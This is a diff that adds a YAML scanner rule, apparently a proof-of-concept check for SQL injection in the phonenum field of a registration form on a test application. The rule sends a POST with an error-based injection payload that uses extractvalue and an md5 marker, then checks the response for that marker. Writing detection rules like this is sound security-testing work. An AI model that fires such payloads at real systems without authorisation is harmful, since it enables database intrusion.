@@ -1,0 +1,16 @@
+name: sqli_reg_phonenum
+rules:
+  - method: POST
+    path: /sqli/sqli_iu/sqli_reg.php
+    follow_redirects: false
+    body: add=JFbTALkdna&email=admin&password=admin&phonenum=admin&sex=JFbTALkdna&submit=submit&username=admin
+    expression: response.status==200 && response.body.bcontains(b'~8be86bbb1f41d547de3dd02f4167d5c') sqli_reg_phonenum
+  - method: POST
+    path: /sqli/sqli_iu/sqli_reg.php
+    follow_redirects: false
+    body: add=JFbTALkdna&email=admin&password=admin&phonenum=admin%27and%2F%2A%2A%2Fextractvalue%281%2Cconcat%28char%28126%29%2Cmd5%281042436408%29%29%29and%27&sex=JFbTALkdna&submit=submit&username=admin
+    expression: response.status==200 && response.body.bcontains(b'~8be86bbb1f41d547de3dd02f4167d5c') sqli_reg_phonenum
+detail:
+  type: sqldet
+  paramkey: phonenum
+  payload: admin'and/**/extractvalue(1,concat(char(126),md5(1042436408)))and'
